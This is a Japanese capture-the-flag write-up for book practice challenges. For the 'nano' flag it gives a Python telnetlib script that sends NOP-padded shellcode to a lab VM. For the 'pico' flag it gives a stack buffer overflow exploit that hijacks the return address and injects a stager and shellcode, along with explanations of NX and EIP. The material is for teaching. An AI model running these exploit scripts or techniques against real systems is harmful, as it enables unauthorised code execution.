# 実行方法
問題のzip内のREADME.mdを参照

#解析
## 一つ目のフラグ
本のとおりです。

## 二つ目のフラグ
`nano`の解析です。
`nano.c`があるので、逆アセンブリの解析は必要ありません。

このプログラムは、完全にpwnの練習用に作られていて、`shellcode`書いてねってことを言ってます。

`shellcode`というのは、pwnで使われる、攻撃を行うためのコードです。
>シェルコードは攻撃の際に使う機械語で書かれたプログラムの断片のことで、主にシェルを起動するために作られている場合が多いことからシェルを起動するかに関わらずシェルコードと呼んでいます。


[CTFチャレンジブックの関連記事](https://book.mynavi.jp/manatee/detail/id=64562)
がわかりやすく解説してくれてます。

シェルコードを送り込むプログラムがこちら(元のやつより簡単にしています)


```
import telnetlib
import time

# IP アドレスは自分のVMのアドレスに合わせてください
tn = telnetlib.Telnet('10.228.155.6', 22222)
s = tn.get_socket()
with open('shellcode_nano', 'rb') as f:
  sc = f.read()
sc = sc.rjust(140, b'\x90')
s.send(b'./nano\n')
time.sleep(0.5)
s.send(sc + b'\n')
print(s.recv(2048))

```

---

解説していきます。
最初の2行で、リモートのマシンに接続します。
やってることは`nc 10.228.155.6 22222`と変わりません。

```
tn = telnetlib.Telnet('10.228.155.6', 22222)
s = tn.get_socket()
```

---

次に作成したシェルコードを読み込みます。
バイナリで読み込むために、引数に`'rb'`を指定しています。
nano.cでは140バイト読み込むので、`0x90`（NOP命令）を使って先頭部分を埋めています。

```
with open('shellcode_nano', 'rb') as f:
  sc = f.read()
sc = sc.rjust(140, b'\x90')
```

---

そして、まずはnanoを実行しましょう。
`'./nano'`という文字列を送ればいいですね。
最後に改行（`'\n'`）を入れるのを忘れずに！
ここで、nanoが立ち上がるのを待つために、`time.sleep()`を使ってプログラムを少し止めます。

```
s.send(b'./nano\n')
time.sleep(0.5)
```

---

最後に、シェルコードを送り込んで、返ってくる文字列を`print`してあげれば完成です。

```
s.send(sc + b'\n')
print(s.recv(2048))
```


## 三つ目のフラグ
スタックバッファオーバーフローの問題です。

https://raintrees.net/attachments/download/307/wikipedia_StackBufferOverflow.png

スタックバッファオーバーフローに対する攻撃では、その関数のリターンアドレスが格納されているメモリを、入力した文字列で上書きすることで、EIP（現在どのメモリの命令を実行するかを示すレジスタ）を奪います。

今回は、NXbitが無効なので、シェルコードを書き込んで、そのアドレスにEIPを持って行くことで、好きなコードを実行できます。
本来シェルコードはこのように攻撃をするためにあります。

*NXbit : プログラムのコード以外の部分を実行可能であるとセキリティ上よくないので、メモリ上で実行不可能な部分を設定すること。
これがオンであると、shellcodeによる攻撃は難しい。

---

逆アセンブリすると、本のようなスタック構造になっているのが分かる。

攻撃手法は本の通りとして、
攻撃コードの解説をする。

基本はnanoの攻撃と同様である。

今回はアドレスを扱うため、pythonの`struct.pack()`関数を用いて
アドレスをリトルエンディアンでフォーマットしている。

---

```
import telnetlib
import time
import struct

def pI(addr):
    return struct.pack('<I', addr)

tn = telnetlib.Telnet('10.228.155.83', 22222)
s = tn.get_socket()
with open('stager', 'rb') as f:
  stager = f.read()
with open('shellcode_pico', 'rb') as f:
  sc = f.read()

s.send(b'./pico\n')
time.sleep(0.5)
tn.read_until(b'addr: ')

addr_pass = int(tn.read_until(b'\n')[:-1], 16)

print('{0}'.format(hex(addr_pass)))

payload1 = b'A'*0x1c
payload1 += pI(addr_pass + 0x20+0x8)
payload1 += b'\x90' * 0x30
payload1 += stager

s.send(payload1 + b'\n')

time.sleep(0.5)

s.send(b'A\n')

payload2 = b''
payload2 += b'\x90'*0x30
payload2 += sc

s.send(payload2)

print(s.recv(2048))
```
